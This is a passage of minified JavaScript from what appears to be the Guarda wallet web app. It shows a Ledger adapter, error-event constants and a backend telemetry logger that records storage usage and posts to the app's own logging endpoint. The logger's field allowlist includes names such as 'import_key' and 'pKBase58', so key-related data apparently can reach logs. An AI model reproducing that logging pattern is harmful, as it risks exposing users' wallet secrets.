            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class AdapterWrapper {
            constructor(e) {
                _defineProperty(this, "__adapter", void 0);
                _defineProperty(this, "sendTransaction", (async e => {
                    try {
                        const t = await this.__adapter.sendTransaction(e);
                        m.$.send(m.d.TX_SEND_LEDGER, e.currencyFrom || e.currency, {
                            hash: t.hash
                        });
                        return t
                    } catch (t) {
                        u.b.error(u.d.FAILED_SEND_LEDGER, {
                            currency: e.currency || this.currency
                        }, t, e);
                        m.$.send(m.d.TX_SEND_FAILED, e.currencyFrom);
                        if (e.exchangeId)
                            try {
                                await (0,
                                d.Z)(e.exchangeId, t)
                            } catch (e) {}
                        return t instanceof c() ? {
                            error: {
                                text: "Failed send tx",
                                code: t.errorCode
                            }
                        } : {
                            error: "Failed send tx"
                        }
                    }
                }
                ));
                this.__adapter = e;
                Object.setPrototypeOf(this, e)
            }
        }
        const p = undefined
          , f = {
            btc: {
                supported: !0,
                adapter: () => Promise.all([a.e(4736), a.e(1669), a.e(2657), a.e(808), a.e(8245), a.e(3727)]).then(a.bind(a, 87340)),
                api: () => a.e(4736).then(a.bind(a, 22485))
            },
            eth: {
                supported: !0,
                adapter: () => Promise.all([a.e(7156), a.e(4278), a.e(2039)]).then(a.bind(a, 52039)),
                api: () => Promise.all([a.e(4736), a.e(7276)]).then(a.bind(a, 42481)),
                tokens: {
                    adapter: () => Promise.all([a.e(4736), a.e(7156), a.e(4278), a.e(4362)]).then(a.bind(a, 67260)),
                    api: () => Promise.all([a.e(4736), a.e(7276)]).then(a.bind(a, 42481))
                }
            },
            bnb: {
                supported: !0,
                adapter: () => a.e(3104).then(a.bind(a, 3104)),
                api: () => a.e(8388).then(a.bind(a, 10938)),
                tokens: {
                    adapter: () => a.e(8332).then(a.bind(a, 68332)),
                    api: () => a.e(8388).then(a.bind(a, 10938))
                }
            }
        }
          , rebuildApi = async e => {
            const t = f[e]
              , a = await s.Z.create()
              , {default: n} = await t.api();
            let r;
            switch (e) {
            case "eth":
            case "bnb":
                r = new n(a);
                break;
            case "btc":
                r = new n({
                    transport: a
                });
                break;
            default:
                throw `${e} is not supported`
            }
            return {
                api: r,
                transport: a
            }
        }
          , getApi = async e => {
            const t = f[e]
              , {default: a} = await t.adapter()
              , {api: n, transport: r} = await rebuildApi(e);
            return new a(n,r)
        }
          , E = {
            isSupported: () => s.Z.isSupported(),
            getListCurrencies: () => Object.keys(f).filter((e => f[e].supported)),
            getApiByWallet: async e => {
                if (e.family) {
                    const t = f[e.family.toLowerCase()].tokens;
                    if (!t)
                        return Promise.resolve(null);
                    const a = await s.Z.create()
                      , {default: n} = await t.adapter()
                      , {default: r} = await t.api()
                      , l = new r(a)
                      , i = Object.assign(e, {
                        api: l
                    });
                    return new AdapterWrapper(new n(i))
                }
                const t = await getApi(e.currency);
                return new AdapterWrapper(t)
            }
            ,
            getApiByCurrency: async e => {
                const t = await getApi(e);
                return new AdapterWrapper(t)
            }
        }
    }
    ,
    919: (e, t, a) => {
        "use strict";
        a.d(t, {
            d: () => D,
            b: () => se
        });
        var n = a(31672)
          , r = a(2490)
          , l = a(59461)
          , s = a(57640)
          , i = a(9924)
          , o = a(41817)
          , c = a(42155)
          , u = a(13196)
          , d = a(12587)
          , m = a(58655)
          , p = a(86575)
          , f = a(76702)
          , E = a(38559)
          , h = a(88449)
          , g = a(59849)
          , y = a(53029)
          , v = a(68841)
          , _ = a(84234);
        const w = {
            key_value: v.Z,
            transactions: _.Z
        };
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class Enricher {
            constructor() {
                _defineProperty(this, "key", void 0)
            }
        }
        var b = a(88921)
          , k = a(96248)
          , S = a(13599)
          , C = a(11477)
          , N = a(64362)
          , T = a(15389)
          , A = a(90401)
          , x = a(45164)
          , I = a(91238)
          , P = a(54837)
          , L = a(87485)
          , F = a(56767)
          , W = a(76651)
          , R = a(61437)
          , B = a(35285)
          , O = a(39865);
        const D = {
            FAILED_CREATE_WALLET: "FAILED_CREATE_WALLET",
            CREATE_WALLET_SUCCESS: "CREATE_WALLET_SUCCESS",
            IMPORT_WALLET_SUCCESS: "IMPORT_WALLET_SUCCESS",
            IMPORT_WALLET_ERROR: "IMPORT_WALLET_ERROR",
            ADD_WALLET_SUCCESS: "ADD_WALLET_SUCCESS",
            ADD_WALLET_ERROR: "ADD_WALLET_ERROR",
            ADD_WO_WALLET_SUCCESS: "ADD_WO_WALLET_SUCCESS",
            ADD_WO_WALLET_ERROR: "ADD_WO_WALLET_ERROR",
            DELETE_WALLET_SUCCESS: "DELETE_WALLET_SUCCESS",
            FAILED_CREATE_WALLET_SAGA: "FAILED_CREATE_WALLET_SAGA",
            FAILED_IMPORT_WALLET: "FAILED_IMPORT_WALLET",
            FAILED_GET_BALANCE: "FAILED_GET_BALANCE",
            UPDATING_BALANCE: "UPDATING_BALANCE",
            UPDATING_BALANCE_IS_TOO_LONG: "UPDATING_BALANCE_IS_TOO_LONG",
            FAILED_UPDATE_BALANCE: "FAILED_UPDATE_BALANCE",
            FAILED_GET_TXS: "FAILED_GET_TXS",
            SEND_SUCCESS: "SEND_SUCCESS",
            FAILED_SEND: "FAILED_SEND",
            FAILED_SEND_LOAN_ADDRESS: "FAILED_SEND_LOAN_ADDRESS",
            FAILED_SEND_EXCHANGE_ADDRESS: "FAILED_SEND_EXCHANGE_ADDRESS",
            FAILED_VALIDATE_ADDRESS: "FAILED_VALIDATE_ADDRESS",
            EXCHANGE_SUCCESS: "EXCHANGE_SUCCESS",
            FAILED_EXCHANGE: "FAILED_EXCHANGE",
            STAKE_SUCCESS: "STAKE_SUCCESS",
            FAILED_STAKE: "FAILED_STAKE",
            UNSTAKE_SUCCESS: "UNSTAKE_SUCCESS",
            FAILED_UNSTAKE: "FAILED_UNSTAKE",
            CLAIM_SUCCESS: "CLAIM_SUCCESS",
            FAILED_CLAIM: "FAILED_CLAIM",
            FAILED_VOTE: "FAILED_VOTE",
            FAILED_XRP_AIRDROP: "FAILED_XRP_AIRDROP",
            FAILED_XRP_DELETE_ACCOUNT: "FAILED_XRP_DELETE_ACCOUNT",
            FAILED_REQUEST_DUST: "FAILED_REQUEST_DUST",
            FAILED_SEND_COMMON: "FAILED_SEND_COMMON",
            FAILED_GET_FEE: "FAILED_GET_FEE",
            FAILED_NORMALIZE_ADDRESS: "FAILED_NORMALIZE_ADDRESS",
            FAILED_KMD_CLAIM: "FAILED_KMD_CLAIM",
            CLO_FAILED_WITHDRAW_STAKING: "CLO_FAILED_WITHDRAW_STAKING",
            CLO_FAILED_CLAIM_STAKING: "CLO_FAILED_CLAIM_STAKING",
            FIO_FAILED_CREATE_INVOICE: "FIO_FAILED_CREATE_INVOICE",
            FIO_FAILED_APPROVE_INVOICE: "FIO_FAILED_APPROVE_INVOICE",
            FIO_FAILED_REJECT_INVOICE: "FIO_FAILED_REJECT_INVOICE",
            FIO_FAILED_ADD_ADDRESSES: "FIO_FAILED_ADD_ADDRESSES",
            UI_ERROR: "UI_ERROR",
            FAILED_SEND_LEDGER: "FAILED_SEND_LEDGER",
            BLOCKBOOK_ERROR: "BLOCKBOOK_ERROR",
            EXCHANGE_CALCULATE_FEE_ERROR: "EXCHANGE_CALCULATE_FEE_ERROR",
            BUYSELL_BUY_CREATE_TRANSACTION_SUCCESS: "BUYSELL_BUY_CREATE_TRANSACTION_SUCCESS",
            BUYSELL_BUY_CREATE_TRANSACTION_ERROR: "BUYSELL_BUY_CREATE_TRANSACTION_ERROR",
            BUYSELL_SELL_CREATE_TRANSACTION_SUCCESS: "BUYSELL_SELL_CREATE_TRANSACTION_SUCCESS",
            BUYSELL_SELL_CREATE_TRANSACTION_ERROR: "BUYSELL_SELL_CREATE_TRANSACTION_ERROR",
            BUYSELL_BUY_GET_ESTIMATE_ERROR: "BUYSELL_BUY_GET_ESTIMATE_ERROR",
            BUYSELL_SELL_GET_ESTIMATE_ERROR: "BUYSELL_SELL_GET_ESTIMATE_ERROR",
            BUYSELL_BUY_GET_LIMITS_ERROR: "BUYSELL_BUY_GET_LIMITS_ERROR",
            BUYSELL_SELL_GET_LIMITS_ERROR: "BUYSELL_SELL_GET_LIMITS_ERROR",
            BUYSELL_SELL_COINS_FILTER_ERROR: "BUYSELL_SELL_COINS_FILTER_ERROR",
            BUYSELL_SELL_TOKENS_FILTER_ERROR: "BUYSELL_SELL_TOKENS_FILTER_ERROR",
            LOAN_SUCCESS: "LOAN_SUCCESS",
            FAILED_LOAN: "FAILED_LOAN",
            LOAN_GET_ESTIMATE_ERROR: "LOAN_GET_ESTIMATE_ERROR",
            LOAN_GET_LOANS_LIST_ERROR: "LOAN_GET_LOANS_LIST_ERROR",
            LOAN_ADD_PHONE_SUCCESS: "LOAN_ADD_PHONE_SUCCESS",
            LOAN_PAYOFF_SUCCESS: "LOAN_PAYOFF_SUCCESS",
            LOAN_PAYOFF_FAILED: "LOAN_PAYOFF_FAILED",
            LOAN_TOPUP_SUCCESS: "LOAN_TOPUP_SUCCESS",
            LOAN_TOPUP_FAILED: "LOAN_TOPUP_FAILED",
            LOAN_AUTH_USER: "LOAN_AUTH_USER",
            FAILED_INITIALIZE_EOS_CREATING: "FAILED_INITIALIZE_EOS_CREATING",
            FAILED_CHECK_EOS_ACCOUNT: "FAILED_CHECK_EOS_ACCOUNT",
            FAILED_GET_FEE_FOR_CREATE_EOS: "FAILED_GET_FEE_FOR_CREATE_EOS",
            FAILED_CREATE_EOS: "FAILED_CREATE_EOS",
            FAILED_CREATE_EOS_WALLET_NOT_FOUND: "FAILED_CREATE_EOS_WALLET_NOT_FOUND",
            CANT_RESTORE_WALLETS: "CANT_RESTORE_WALLETS",
            RESTORE_WALLET_SUCCESS: "RESTORE_WALLET_SUCCESS",
            RESTORE_WALLET_ERROR: "RESTORE_WALLET_ERROR",
            FAILED_CREATE_TOKEN: "FAILED_CREATE_TOKEN",
            FAILED_GET_EXCHANGE_CURRENCIES: "FAILED_GET_EXCHANGE_CURRENCIES",
            FAILED_GET_EXCHANGE_ESTIMATES: "FAILED_GET_EXCHANGE_ESTIMATES",
            FAILED_GET_EXCHANGE_TRANSACTION_BY_ID: "FAILED_GET_EXCHANGE_TRANSACTION_BY_ID",
            FAILED_GET_TOKENS_CURRENCIES: "FAILED_GET_TOKENS_CURRENCIES",
            CANT_CREATE_EXCHANGE_TX_BY_API: "CANT_CREATE_EXCHANGE_TX_BY_API",
            CANT_CREATE_ORDER_INFO: "CANT_CREATE_ORDER_INFO",
            CANT_PERSIST_SECURE_ITEM: "CANT_PERSIST_SECURE_ITEM",
            CANT_PROCESS_MIGRATION_V3: "CANT_PROCESS_MIGRATION_V3",
            CANT_PROCESS_MIGRATION_V4: "CANT_PROCESS_MIGRATION_V4",
            CANT_PROCESS_MIGRATION_V11: "CANT_PROCESS_MIGRATION_V11",
            CANT_PROCESS_MIGRATION_V15: "CANT_PROCESS_MIGRATION_V15",
            CANT_PROCESS_MIGRATION_V16: "CANT_PROCESS_MIGRATION_V16",
            CANT_PROCESS_MIGRATION_V18: "CANT_PROCESS_MIGRATION_V18",
            CANT_PROCESS_MIGRATION_V19: "CANT_PROCESS_MIGRATION_V19",
            CANT_PROCESS_MIGRATION_V26: "CANT_PROCESS_MIGRATION_V26",
            CANT_PROCESS_MIGRATION_V28: "CANT_PROCESS_MIGRATION_V28",
            CANT_PROCESS_MIGRATION_V29: "CANT_PROCESS_MIGRATION_V29",
            CANT_PROCESS_MIGRATION_V32: "CANT_PROCESS_MIGRATION_V32",
            CANT_PROCESS_MIGRATION_V33: "CANT_PROCESS_MIGRATION_V33",
            CANT_PROCESS_MIGRATION_V34: "CANT_PROCESS_MIGRATION_V34",
            CANT_PROCESS_MIGRATION_V35: "CANT_PROCESS_MIGRATION_V35",
            CANT_PROCESS_MIGRATION_V36: "CANT_PROCESS_MIGRATION_V36",
            CANT_PROCESS_MIGRATION_V37: "CANT_PROCESS_MIGRATION_V37",
            CANT_PROCESS_MIGRATION_V38: "CANT_PROCESS_MIGRATION_V38",
            CANT_PROCESS_MIGRATION_V39: "CANT_PROCESS_MIGRATION_V39",
            CANT_PROCESS_MIGRATION_V40: "CANT_PROCESS_MIGRATION_V40",
            CANT_PROCESS_MIGRATION_V41: "CANT_PROCESS_MIGRATION_V41",
            CANT_PROCESS_MIGRATION_V42: "CANT_PROCESS_MIGRATION_V42",
            CANT_PROCESS_MIGRATION_V43: "CANT_PROCESS_MIGRATION_V43",
            CANT_PROCESS_MIGRATION_V44: "CANT_PROCESS_MIGRATION_V44",
            CANT_PROCESS_MIGRATION_V45: "CANT_PROCESS_MIGRATION_V45",
            CANT_PROCESS_MIGRATION_V47: "CANT_PROCESS_MIGRATION_V47",
            CANT_PROCESS_MIGRATION_V49: "CANT_PROCESS_MIGRATION_V49",
            CANT_PROCESS_MIGRATION_V50: "CANT_PROCESS_MIGRATION_V50",
            CANT_PROCESS_MIGRATION_V51: "CANT_PROCESS_MIGRATION_V51",
            CANT_PROCESS_MIGRATION_V52: "CANT_PROCESS_MIGRATION_V52",
            CANT_PROCESS_MIGRATION_V53: "CANT_PROCESS_MIGRATION_V53",
            CANT_PROCESS_MIGRATION_V54: "CANT_PROCESS_MIGRATION_V54",
            FAILED_XTZ_VALIDATORS_API: "FAILED_XTZ_VALIDATORS_API",
            FAILED_GET_SIMPLEX_ESTIMATE: "FAILED_GET_SIMPLEX_ESTIMATE",
            FAILED_GET_GUARDARIAN_ESTIMATE: "FAILED_GET_GUARDARIAN_ESTIMATE",
            FAILED_GET_GUARDARIAN_LIMITS: "FAILED_GET_GUARDARIAN_LIMITS",
            FAILED_GET_EXCHANGE_LIMITS: "FAILED_GET_EXCHANGE_LIMITS",
            FAILED_PERSIST_CREATE_DATABASE: "FAILED_PERSIST_CREATE_DATABASE",
            FAILED_PERSIST_DESTROY_DATABASE: "FAILED_PERSIST_DESTROY_DATABASE",
            FAILED_PERSIST_VALIDATE_WRITE_SKIPPED: "FAILED_PERSIST_VALIDATE_WRITE_SKIPPED",
            FAILED_PERSIST_BULK_MIGRATION_WRITE_SKIPPED: "FAILED_PERSIST_BULK_MIGRATION_WRITE_SKIPPED",
            FAILED_PERSIST_WRITE: "FAILED_PERSIST_WRITE",
            FAILED_PERSIST_READ: "FAILED_PERSIST_READ",
            FAILED_PERSIST_REMOVE: "FAILED_PERSIST_REMOVE",
            FAILED_PERSIST_READ_BACKUP: "FAILED_PERSIST_READ_BACKUP",
            DEBUG_PERSIST_STORAGE_ESTIMATE: "DEBUG_PERSIST_STORAGE_ESTIMATE",
            DEBUG_WALLET_COUNT_CHANGED: "DEBUG_WALLET_COUNT_CHANGED",
            NOT_FOUND_404: "NOT_FOUND_404",
            FAILED_TO_GET_APP_SETTINGS: "FAILED_TO_GET_APP_SETTINGS",
            GET_ADDRESS_FROM_MNEMONIC_ERROR: "GET_ADDRESS_FROM_MNEMONIC_ERROR",
            FAILED_LOGIN: "FAILED_LOGIN",
            SYNC_XMR_START: "SYNC_XMR_START",
            SYNC_XMR_FAILED: "SYNC_XMR_FAILED",
            STAKING_ERROR: "STAKING_ERROR",
            STAKING_SUCCESS: "STAKING_SUCCESS",
            REDEEM_ERROR: "REDEEM_ERROR",
            CLAIM_ERROR: "CLAIM_ERROR",
            UNSTAKE_ERROR: "UNSTAKE_ERROR",
            SDIL_EVENT: "SDIL_EVENT",
            FAILED_APPROVE_EXCHANGE: "FAILED_APPROVE_EXCHANGE",
            FAILED_SEND_DEX_EXCHANGE: "FAILED_SEND_DEX_EXCHANGE",
            FAILED_TO_CREATE_GETH: "FAILED_TO_CREATE_GETH",
            BRODCASTING_TRANSACTION: "BRODCASTING_TRANSACTION",
            BRODCASTING_TRANSACTION_IS_TOO_LONG: "BRODCASTING_TRANSACTION_IS_TOO_LONG"
        };
        function storage_estimate_defineProperty(e, t, a) {
            (t = storage_estimate_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function storage_estimate_toPropertyKey(e) {
            var t = storage_estimate_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function storage_estimate_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const M = new Set([D.FAILED_PERSIST_CREATE_DATABASE, D.FAILED_PERSIST_DESTROY_DATABASE, D.FAILED_PERSIST_VALIDATE_WRITE_SKIPPED, D.FAILED_PERSIST_BULK_MIGRATION_WRITE_SKIPPED, D.FAILED_PERSIST_WRITE, D.FAILED_PERSIST_READ, D.FAILED_PERSIST_REMOVE, D.FAILED_PERSIST_READ_BACKUP, D.DEBUG_PERSIST_STORAGE_ESTIMATE]);
        class StorageEstimateEnricher extends Enricher {
            constructor() {
                super(...arguments);
                storage_estimate_defineProperty(this, "key", "storageEstimate")
            }
            async run(e) {
                var t;
                if (!M.has(e.type))
                    return;
                const a = await (null === (t = navigator.storage) || void 0 === t ? void 0 : t.estimate())
                  , n = {
                    ...a
                };
                void 0 !== a.quota && void 0 !== a.usage && (n.quotaUsage = a.usage / a.quota);
                (0,
                f.d)(n);
                return n
            }
        }
        function indexeddb_object_counts_defineProperty(e, t, a) {
            (t = indexeddb_object_counts_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function indexeddb_object_counts_toPropertyKey(e) {
            var t = indexeddb_object_counts_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function indexeddb_object_counts_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class IndexeddbObjectCountsEnricher extends Enricher {
            constructor() {
                super(...arguments);
                indexeddb_object_counts_defineProperty(this, "key", "indexeddbObjectCounts")
            }
            async databases() {
                if (indexedDB.databases)
                    try {
                        return await indexedDB.databases()
                    } catch (e) {
                        console.warn(e)
                    }
                return [["_rxdb_internal", {
                    version: 0
                }], ...Object.entries(w)].map((e => {
                    let[t,a] = e;
                    return {
                        name: ["_pouch_guarda_app_redux_persist_db_persist_ls", "rxdb", a.version, t].join("-"),
                        version: 5
                    }
                }
                ))
            }
            async run(e) {
                if (!M.has(e.type))
                    return;
                const t = await this.databases()
                  , a = await Promise.all(t.map((async e => {
                    let {name: t} = e;
                    const a = await y.X3(t)
                      , n = [...a.objectStoreNames]
                      , r = await Promise.all(n.map((async e => {
                        const n = await a.transaction(e, "readonly").objectStore(e).count()
                          , r = {
                            count: n
                        };
                        if (t.endsWith("-key_value") && "by-sequence" === e && n <= IndexeddbObjectCountsEnricher.RECORD_SIZES_COUNT_THRESHOLD) {
                            const t = await a.getAll(e)
                              , n = Object.fromEntries(t.map((e => {
                                let {_doc_id_rev: t, ...a} = e;
                                const n = Object.values(a);
                                if ("string" == typeof t && 1 === n.length) {
                                    const [e] = n;
                                    if ("string" == typeof e)
                                        return [t, e.length]
                                }
                            }
                            )).filter((e => void 0 !== e)));
                            r.recordDataLengths = n
                        }
                        return [e, r]
                    }
                    )));
                    return [t, Object.fromEntries(r)]
                }
                )))
                  , n = Object.fromEntries(a);
                (0,
                f.d)(n);
                return n
            }
        }
        indexeddb_object_counts_defineProperty(IndexeddbObjectCountsEnricher, "RECORD_SIZES_COUNT_THRESHOLD", 64);
        function local_storage_value_lengths_defineProperty(e, t, a) {
            (t = local_storage_value_lengths_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function local_storage_value_lengths_toPropertyKey(e) {
            var t = local_storage_value_lengths_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function local_storage_value_lengths_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        function *storageEntries(e) {
            for (let t = 0; t < e.length; t++) {
                const a = e.key(t);
                if (!a)
                    continue;
                const n = e.getItem(a);
                yield[a, n]
            }
        }
        class LocalStorageValueLengthsEnricher extends Enricher {
            constructor() {
                super(...arguments);
                local_storage_value_lengths_defineProperty(this, "key", "localStorageValueLengths")
            }
            async run(e) {
                if (!M.has(e.type))
                    return;
                const t = Object.fromEntries([...storageEntries(window.localStorage)].map((e => {
                    let[t,a] = e;
                    return [t, (null != a ? a : "").length]
                }
                )));
                (0,
                f.d)(t);
                return t
            }
        }
        const U = [new StorageEstimateEnricher, new LocalStorageValueLengthsEnricher, new IndexeddbObjectCountsEnricher];
        async function enrichLoggerRecord(e) {
            const t = undefined
              , a = (await Promise.all(U.map((async t => {
                try {
                    const a = await t.run(e);
                    if (!a)
                        return;
                    return {
                        [t.key]: a
                    }
                } catch (e) {
                    console.warn(e);
                    return {
                        [t.key]: e
                    }
                }
            }
            )))).map(f.q);
            return {
                ...e,
                body: [...e.body, ...a]
            }
        }
        var G = a(10072)
          , V = a(23042)
          , K = a(99137)
          , H = a(71957)
          , z = a(96306)
          , j = a(103)
          , $ = a(74592)
          , Z = a(58276)
          , Y = a(35082)
          , q = a(12813)
          , X = a(18222)
          , Q = a(38563)
          , J = a(50336)
          , ee = a(7512);
        function dynamicThrottle(e) {
            const t = new Map;
            return function(a, n) {
                if (!t.get(a)) {
                    for (var r = arguments.length, l = new Array(r > 2 ? r - 2 : 0), s = 2; s < r; s++)
                        l[s - 2] = arguments[s];
                    n(...l);
                    t.set(a, !0);
                    setTimeout(( () => {
                        t.set(a, !1)
                    }
                    ), e)
                }
            }
        }
        var te = a(2194);
        function backend_defineProperty(e, t, a) {
            (t = backend_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function backend_toPropertyKey(e) {
            var t = backend_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function backend_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const ae = (0,
        c.Z)()
          , ne = new Date
          , re = dynamicThrottle(1e3)
          , le = d.P.create({
            name: "BackendLogger"
        });
        class Logger {
            constructor(e) {
                let {apiClient: t=p.nW} = e;
                backend_defineProperty(this, "_backupId", void 0);
                backend_defineProperty(this, "_encryptedBackupHash", void 0);
                backend_defineProperty(this, "_walletCount", void 0);
                backend_defineProperty(this, "apiClient", void 0);
                this.apiClient = t
            }
            _createLoggerRecord(e, t) {
                var a;
                const n = t.find((e => "object" == typeof e && e.backup_id))
                  , r = n ? n.backup_id : null !== (a = this._backupId) && void 0 !== a ? a : "backupId not defined";
                return {
                    platform: (0,
                    u.Xf)(),
                    env: (0,
                    u.dU)(),
                    updatedAt: null == ne ? void 0 : ne.getTime(),
                    createdAt: Date.now(),
                    href: "https://guarda.com/app",
                    type: e,
                    body: t,
                    backupId: r,
                    encryptedBackupHash: this._encryptedBackupHash,
                    walletCount: this._walletCount,
                    tabId: ae
                }
            }
            async _send(e, t) {
                try {
                    let a = t.map(f.q);
                    const n = undefined;
                    if (!await (0,
                    m.X)({
                        param: a,
                        network: te.Z.ALL
                    })) {
                        let t = e;
                        e = D.SDIL_EVENT;
                        const n = undefined;
                        a = [{
                            eventType: t
                        }].map(f.q)
                    }
                    let r = this._createLoggerRecord(e, a);
                    try {
                        r = await enrichLoggerRecord(r)
                    } catch (t) {
                        le.error(`Failed to enrich log for type ${e}`, t)
                    }
                    await this.apiClient.post("/api/v2/internal/logger", r)
                } catch (t) {
                    le.error(`Failed to send log for type ${e}`, t)
                }
            }
            async _log(e, t, a) {
                "error" === e && le.error(...a);
                re(t, (async () => {
                    await this._send(t, a)
                }
                ))
            }
            async error(e) {
                for (var t = arguments.length, a = new Array(t > 1 ? t - 1 : 0), n = 1; n < t; n++)
                    a[n - 1] = arguments[n];
                await this._log("error", e, a)
            }
            async success(e) {
                for (var t = arguments.length, a = new Array(t > 1 ? t - 1 : 0), n = 1; n < t; n++)
                    a[n - 1] = arguments[n];
                await this._log("success", e, a)
            }
            setBackupId(e) {
                this._backupId = e
            }
            setEncryptedBackupHash(e) {
                this._encryptedBackupHash = e
            }
            setWalletCount(e) {
                this._walletCount = e
            }
        }
        const se = new Logger({})
    }
    ,
    76702: (e, t, a) => {
        "use strict";
        a.d(t, {
            d: () => dangerouslyMarkObjectAsClean,
            q: () => deepCleanParams
        });
        var n = a(88921)
          , r = a.n(n)
          , l = a(96248)
          , s = a.n(l)
          , i = a(13599)
          , o = a.n(i)
          , c = a(11477)
          , u = a.n(c)
          , d = a(64362)
          , m = a.n(d)
          , p = a(15389)
          , f = a.n(p)
          , E = a(90401)
          , h = a.n(E)
          , g = a(45164)
          , y = a.n(g)
          , v = a(91238)
          , _ = a.n(v)
          , w = a(54837)
          , b = a.n(w)
          , k = a(87485)
          , S = a.n(k)
          , C = a(56767)
          , N = a.n(C)
          , T = a(76651)
          , A = a.n(T)
          , x = a(61437)
          , I = a.n(x)
          , P = a(35285)
          , L = a.n(P)
          , F = a(39865)
          , W = a.n(F)
          , R = a(43561)
          , B = a.n(R)
          , O = a(32049)
          , D = a.n(O)
          , M = a(38559)
          , U = a.n(M)
          , G = a(57640)
          , V = a.n(G)
          , K = a(9924)
          , H = a.n(K)
          , z = a(88449)
          , j = a.n(z)
          , $ = a(2490)
          , Z = a.n($)
          , Y = a(59849)
          , q = a.n(Y)
          , X = a(9669)
          , Q = a.n(X);
        const J = new Set(["eventType", "from", "to", "value", "address", "balance", "currency", "currencyFrom", "currencyTo", "familyFrom", "familyTo", "addressFrom", "addressTo", "amount", "amountInUsd", "fiat", "partner", "response", "totalBalance", "isFeeIncluded", "extraId", "gasLimit", "gasPrice", "message", "error", "err", "errorCode", "browser", "stack", "limits", "createdAt", "accountName", "fee", "url", "machineState", "extraId", "response", "validatorAddress", "validatorRate", "validatorTitle", "cause", "primaryCause", "fallbackCause", "depositType", "networkTo", "storageEstimate", "indexeddbObjectCounts", "localStorageValueLengths", "walletCounts", "key_currency", "import_key", "backup_id", "exchange_id", "validator", "collateralCurrency", "borrowCurrency", "collateralAmount", "collateralAmountInUsd", "txHash", "isUsedMnemonic", "typeofPK", "validatorPKS", "typeofValidatorPKS", "userAddressBase58", "pKBase58", "validatorPKBase58"])
          , ee = new WeakSet;
        function dangerouslyMarkObjectAsClean(e) {
            e && "object" == typeof e && ee.add(e)
        }
        function deepCleanParamsRecursive(e, t) {
            if (t < 0)
                return null;
            if ("string" == typeof e)
                return e;
            if (e instanceof Error) {
                const a = {
                    name: e.name,
                    message: e.message || void 0,
                    code: e.code || void 0,
                    stack: e.stack || void 0,
                    cause: deepCleanParamsRecursive(e.cause || void 0, t - 1),
                    primaryCause: deepCleanParamsRecursive(e.primaryCause || void 0, t - 1),
                    fallbackCause: deepCleanParamsRecursive(e.fallbackCause || void 0, t - 1),
                    reason: deepCleanParamsRecursive(e.reason || void 0, t - 1)
                };
                Q().isAxiosError(e) && Object.assign(a, {
                    response: "object" == typeof e.response ? {
                        data: e.response.data
                    } : null,
                    status: e.response && e.response.status ? e.response.status : void 0,
                    url: e.config ? e.config.url : void 0,
                    data: e.config ? e.config.data : void 0,
                    method: e.config ? e.config.method : void 0
                });
                return a
            }
            return "object" == typeof e && e ? ee.has(e) ? e : Object.fromEntries(Object.entries(e).filter((e => {
                let[t] = e;
                return J.has(t)
            }
            )).map((e => {
                let[a,n] = e;
                return [a, deepCleanParamsRecursive(n, t - 1)]
            }
            ))) : null
        }
        function deepCleanParams(e) {
            return deepCleanParamsRecursive(e, 5)
        }
    }
    ,
    12587: (e, t, a) => {
        "use strict";
        a.d(t, {
            P: () => LoggerClass
        });
        var n = a(57640)
          , r = a.n(n)
          , l = a(9924)
          , s = a.n(l)
          , i = a(38862)
          , o = a.n(i)
